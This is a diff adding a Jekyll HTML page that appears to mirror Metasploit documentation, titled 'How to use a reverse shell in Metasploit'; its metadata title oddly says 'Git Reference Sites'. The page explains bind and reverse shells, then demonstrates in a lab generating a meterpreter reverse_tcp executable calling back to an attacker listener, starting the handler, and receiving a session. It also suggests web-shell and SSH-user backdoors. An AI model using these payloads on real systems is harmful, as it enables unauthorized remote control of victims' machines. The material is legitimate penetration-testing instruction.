@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Git Reference Sites | Metasploit spike</title>
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="Git Reference Sites" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Learning Git" />
+<meta property="og:description" content="Learning Git" />
+<link rel="canonical" href="/metasploit-framework/articles/Git-Reference-Sites.html" />
+<meta property="og:url" content="/metasploit-framework/articles/Git-Reference-Sites.html" />
+<meta property="og:site_name" content="Metasploit spike" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2012-01-12T17:14:28+00:00" />
+<script type="application/ld+json">
+{"description":"Learning Git","headline":"Git Reference Sites","dateModified":"2012-01-12T17:14:28+00:00","datePublished":"2012-01-12T17:14:28+00:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/metasploit-framework/articles/Git-Reference-Sites.html"},"url":"/metasploit-framework/articles/Git-Reference-Sites.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/metasploit-framework/assets/main.css"><link type="application/atom+xml" rel="alternate" href="/metasploit-framework/feed.xml" title="Metasploit spike" /></head>
+<body><header class="site-header" role="banner">
+
+    <div class="wrapper"><a class="site-title" rel="author" href="/metasploit-framework/">Metasploit spike</a><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewBox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+              </svg>
+            </span>
+          </label>
+  
+          <div class="trigger">
+            <a class="page-link" href="/metasploit-framework/">Articles</a><a class="page-link" href="/metasploit-framework/modules/">Modules</a></div>
+        </nav></div>
+  </header>
+  <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">How to use a reverse shell in Metasploit</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2017-02-24T18:05:35+00:00" itemprop="datePublished">Feb 24, 2017
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>There are two popular types of shells: bind and reverse. A bind shell is the kind that opens up a new service on the target machine, and requires the attacker to connect to it in order to get a session. A reverse shell (also known as a connect-back) is the exact opposite: it requires the attacker to set up a listener first on his box, the target machine acts as a client connecting to that listener, and then finally the attacker receives the shell.</p>
+
+<p>The basic usage of payloads is already quite well documented in the <a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/users_guide_4.3.pdf">Users Guide</a> in Metasploit’s documentation folder. However, learning how to use a reverse shell still remains the most common question in the Metasploit community. Plus, 9 times out of 10 you’d probably be using a reverse shell to get a session, so in this wiki documentation we will explain more about this.</p>
+
+<h2 id="list-of-metasploit-reverse-shells">List of Metasploit reverse shells</h2>
+
+<p>As of now, there are 168 different reverse shells in the Metasploit Framework. We will not list all of them here, because that’s just straight up spamming. But if you’d like, you can run the following command to get msfpayload to tell you:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfpayload <span class="nt">-l</span> |grep reverse
+</code></pre></div></div>
+
+<p>As a rule of thumb, always pick a meterpreter, because it currently provides better support of post exploitation Metasploit has to offer. For example, railgun, post modules, unique meterpreter commands (like webcam controls), etc.</p>
+
+<p>In Windows, the most commonly used reverse shell is windows/meterpreter/reverse. But you can also try windows/meterpreter/reverse_http or windows/meterpreter/reverse_https, because their network traffic appear a little bit less abnormal.</p>
+
+<p>In Linux, you can also try linux/x86/meterpreter/reverse_tcp, or the 64-bit one. However, just know that linux/x86/shell_reverse_tcp has been the most stable.</p>
+
+<h2 id="when-to-use-a-reverse-shell">When to use a reverse shell</h2>
+
+<p>If you find yourself in one of the following scenarios (but not limited to), then you should consider using a reverse shell:</p>
+
+<ul>
+  <li>The target machine is behind a different private network.</li>
+  <li>The target machine’s firewall blocks incoming connection attempts to your bindshell.</li>
+  <li>Your payload is unable to bind to the port it wants due to whatever reason.</li>
+  <li>You simply can’t decide what to choose.</li>
+</ul>
+
+<h2 id="when-a-reverse-shell-isnt-needed">When a reverse shell isn’t needed</h2>
+
+<p>Generally speaking, if you can backdoor an existing service, you may not need a reverse shell. For example: if the target machine is already running a SSH server, then you can try adding a new user to it and use that.</p>
+
+<p>If the target machine is running a web server that supports a server-side programming language, then you can leave a backdoor in that language. For example, many Apache servers support PHP, then you can use a PHP “web shell”. IIS servers usually support ASP, or ASP.net. The Metasploit Framework offers payloads in all these languages (and many others).</p>
+
+<p>Same thing for VNC, remote desktop, SMB (psexec), or other remote admin tools, etc.</p>
+
+<h2 id="how-to-set-up-for-a-reverse-shell-during-payload-generation">How to set up for a reverse shell during payload generation</h2>
+
+<p>When you generate a reverse shell with either msfpayload or msfvenom, you must know how to configure the following:</p>
+
+<ul>
+  <li><strong>LHOST</strong> - This is the IP address you want your target machine to connect to, literally. If you’re in a local area network, it is unlikely your target machine can actually reach you unless you both are in the same network. In that case, you will have to <a href="https://www.google.com/webhp?q=ip#q=ip">find out your public-facing IP address</a>, and then configure your network to port-forward that connection to your box. LHOST should not be “localhost”, or “0.0.0.0”, or “127.0.0.1”, because if you do, you’re telling the target machine to connect to itself (or it may not work at all).</li>
+  <li><strong>LPORT</strong> - This the port you want your target machine to connect to.</li>
+</ul>
+
+<p>When you set up a listener for the reverse shell, you also at least need to configure LHOST and LPORT, but slightly different meanings (different perspective):</p>
+
+<ul>
+  <li><strong>LHOST</strong> - This is the IP address you want your listener to bind to.</li>
+  <li><strong>LPORT</strong> - This is the port you want your listener to bind to.</li>
+</ul>
+
+<p>You should make sure the listener has started first before executing the reverse shell.</p>
+
+<h2 id="demonstration">Demonstration</h2>
+
+<p>In this demonstration, we have two boxes:</p>
+
+<p><strong>Box A:</strong></p>
+
+<ul>
+  <li>The attacker’s box that receives the payload session</li>
+  <li>IP is: 192.168.1.123 (ifconfig)</li>
+  <li>On the same network as the victim machine</li>
+</ul>
+
+<p><strong>Box B:</strong></p>
+
+<ul>
+  <li>The “victim” machine</li>
+  <li>Windows XP</li>
+  <li>IP is: 192.168.1.80 (ipconfig)</li>
+  <li>On the same network as the attacker machine</li>
+  <li>For testing purposes, no antivirus enabled.</li>
+  <li>For testing purposes, no firewall enabled, either.</li>
+</ul>
+
+<p><strong>Step 1: I generate my executable payload:</strong></p>
+
+<p>On the attacker’s box, I run msfpayload like the following (or msfvenom, whatever you prefer):</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./msfpayload windows/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>192.168.1.123 <span class="nv">lport</span><span class="o">=</span>4444 X <span class="o">&gt;</span> /tmp/iambad.exe
+Created by msfpayload <span class="o">(</span>http://www.metasploit.com<span class="o">)</span><span class="nb">.</span>
+Payload: windows/meterpreter/reverse_tcp
+Length: 287
+Options: <span class="o">{</span><span class="s2">"LHOST"</span><span class="o">=&gt;</span><span class="s2">"192.168.1.123"</span>, <span class="s2">"LPORT"</span><span class="o">=&gt;</span><span class="s2">"4444"</span><span class="o">}</span>
+</code></pre></div></div>
+
+<p><strong>Step 2: I copy my executable payload to Box B (my victim machine)</strong></p>
+
+<p>This step requires no further explanation.</p>
+
+<p><strong>Step 3: I set up my payload handler on box A (the attacker’s box):</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./msfconsole <span class="nt">-q</span>
+msf <span class="o">&gt;</span> use exploit/multi/handler
+msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/meterpreter/reverse_tcp
+payload <span class="o">=&gt;</span> windows/meterpreter/reverse_tcp
+msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost 192.168.1.123
+lhost <span class="o">=&gt;</span> 192.168.1.123
+msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lport 4444
+lport <span class="o">=&gt;</span> 4444
+msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse handler on 192.168.1.123:4444
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting the payload handler...
+</code></pre></div></div>
+
+<p><strong>Step 4: I double-click on the malicious executable</strong></p>
+
+<p>This step requires no further explanation.</p>
+
+<p><strong>Step 5: I should see a meterpreter/payload session on box A (the attacker’s box)</strong></p>
+
+<p>Like this:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./msfconsole <span class="nt">-q</span>
+msf <span class="o">&gt;</span> use exploit/multi/handler
+msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/meterpreter/reverse_tcp
+payload <span class="o">=&gt;</span> windows/meterpreter/reverse_tcp
+msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost 192.168.1.123
+lhost <span class="o">=&gt;</span> 192.168.1.123
+msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lport 4444
+lport <span class="o">=&gt;</span> 4444
+msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse handler on 192.168.1.123:4444
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting the payload handler...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>770048 bytes<span class="o">)</span> to 192.168.1.80
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>192.168.1.123:4444 -&gt; 192.168.1.80:1138<span class="o">)</span> at 2014-10-22 19:03:43 <span class="nt">-0500</span>
+meterpreter <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>The meterpreter prompt means you are currently interacting with the payload.</p>
+
+  </div><a class="u-url" href="/metasploit-framework/articles/How-to-use-a-reverse-shell-in-Metasploit.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/metasploit-framework/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Metasploit spike</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Metasploit spike</li><li><a class="u-email" href="mailto:your-email@example.com">your-email@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/metasploit-framework/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/metasploit-framework/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
